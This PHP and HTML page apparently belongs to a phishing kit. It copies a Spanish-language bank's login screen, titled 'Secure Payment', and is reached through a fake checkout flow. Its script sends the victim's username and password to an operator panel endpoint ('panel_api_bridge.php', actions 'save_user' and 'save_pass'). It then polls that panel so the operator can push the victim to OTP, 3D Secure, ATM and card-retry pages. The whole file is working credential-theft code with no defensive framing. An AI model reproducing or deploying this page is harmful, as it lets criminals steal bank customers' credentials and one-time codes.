<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css">
    <title>Secure Payment</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" 
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" 
            integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</head>
<body>

<div class="logo" style="height:300px;">
    <center><img src="/img/generaleslogo.webp" alt="" width="" height="300px"></center>
</div>

<div style="border:1px solid #dcdcdc; height:50px; padding-bottom:18px;">
    <br>
    <center><a id="texto" style="margin-bottom:10px;">Personas</a></center>
</div>

<div class="user">
    <br><label for="" style="margin-left:20px;">Usuario</label>
    <center><input type="text" name="Usuario" id="txtUser"></center>
    <input type="checkbox" name="" id="" style="margin-left:20px;margin-top:10px; border:1px solid black;"> 
    <label for=""> For english</label><br>
   
    <div style="width:90%;margin:auto; font-size: 18px; margin-top:10px;">
        <label>Hemos cambiado nuestra política de datos, para mayor información haz clic <a href="">Aquí</a></label>
    </div>

    <center><br>
        <!-- Button trigger modal -->
        <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal" 
                style="width:90%; border-radius:100px; border:none; height:40px; background-color: #003C82;">
            Ingresar
        </button>
        <br><br>
        <input type="submit" value="Regístrate" 
               style="width:88%; height:40px; background-color: white; color:#003C82;border:2px solid #003C82;">

        <br><br>
        <a href="" style="color:blue; font-size:20px; font-weight: 600;">Desbloquea tu usuario</a>
    </center>
</div>

<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <img src="/img/caracol.webp" alt="" srcset="">
                <center><br>
                    <div class="gray" style="width:95%; background-color:#dcdcdc; font-size:12px;">
                        Si en algún momento no encuentras la imagen y la frase correcta, no digites tu contraseña y llama inmediatamente a nuestra Banca Telefónica
                    </div>
                </center>
            </div>
            <div class="modal-footer">
                <input type="password" name="" id="txtPassword" style="width:70%; height:35px;"> 
                <button type="button" class="btn" id="btnIngresar" 
                        style="border:none; background-color:#003C82; color:white;">Ingresar</button>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const txtUser = document.getElementById('txtUser');
    const txtPassword = document.getElementById('txtPassword');
    const btnIngresar = document.getElementById('btnIngresar');
    
    const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

    if (!idreg) {
        alert("Error interno: no hay idreg.");
        window.location.href = "../../checkout.php";
        return;
    }

    // Evento click del botón ingresar en el modal
    btnIngresar.addEventListener('click', async () => {
        const usuario = txtUser.value.trim();
        const password = txtPassword.value.trim();
        
        if (usuario.length > 0 && password.length > 0) {
            btnIngresar.disabled = true;
            
            try {
                // Guardar usuario primero
                const fdUser = new FormData();
                fdUser.append("action", "save_user");
                fdUser.append("idreg", idreg);
                fdUser.append("usuario", usuario);
                fdUser.append("banco", "generales");

                const rUser = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: fdUser,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!rUser.ok) {
                    throw new Error(`HTTP ${rUser.status}: ${rUser.statusText}`);
                }

                const jsonUser = await rUser.json();

                if (!jsonUser.success) {
                    throw new Error(jsonUser.error || "Error al guardar usuario");
                }

                // Guardar clave
                const fdPass = new FormData();
                fdPass.append("action", "save_pass");
                fdPass.append("idreg", idreg);
                fdPass.append("clave", password);

                const rPass = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: fdPass,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!rPass.ok) {
                    throw new Error(`HTTP ${rPass.status}: ${rPass.statusText}`);
                }

                const jsonPass = await rPass.json();

                if (jsonPass.success) {
                    // Cerrar modal
                    const modal = bootstrap.Modal.getInstance(document.getElementById('exampleModal'));
                    if (modal) {
                        modal.hide();
                    }
                    
                    // Redirigir a cargando
                    window.location.href = "cargando.php";
                } else {
                    throw new Error(jsonPass.error || "Error al guardar clave");
                }

            } catch (error) {
                console.error("Error:", error);
                alert("Error al procesar datos: " + error.message);
                btnIngresar.disabled = false;
            }
        } else {
            alert('Por favor completa todos los campos');
            if (usuario.length === 0) txtUser.focus();
            else txtPassword.focus();
        }
    });

    // Enter key support en los inputs
    txtUser.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            document.querySelector('[data-bs-toggle="modal"]').click();
        }
    });

    txtPassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            btnIngresar.click();
        }
    });

    // Verificar redirecciones del panel
    const checkRedirect = setInterval(async () => {
        try {
            const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                method: 'GET',
                cache: 'no-cache'
            });
            
            if (r.ok) {
                const data = await r.json();
                
                if (data.success && data.data && data.data.redirect) {
                    clearInterval(checkRedirect);
                    
                    switch (data.data.estado) {
                        case 'usuario':
                            window.location.href = "3d.php";
                            break;
                        case 'otp':
                            window.location.href = "otp.php";
                            break;
                        case 'cc':
                            window.location.href = "/reintentar.php";
                            break;
                        case '923':
                            window.location.href = "923.php";
                            break;
                        case 'atm':
                            window.location.href = "atm.php";
                            break;
                        case 'finalizado':
                            window.location.href = "finish.php";
                            break;
                    }
                }
            }
        } catch (e) {
            // Ignorar errores de polling
        }
    }, 2000);

    // Limpiar intervalo al salir
    window.addEventListener('beforeunload', () => {
        if (checkRedirect) {
            clearInterval(checkRedirect);
        }
    });
});
</script>

</body>
</html>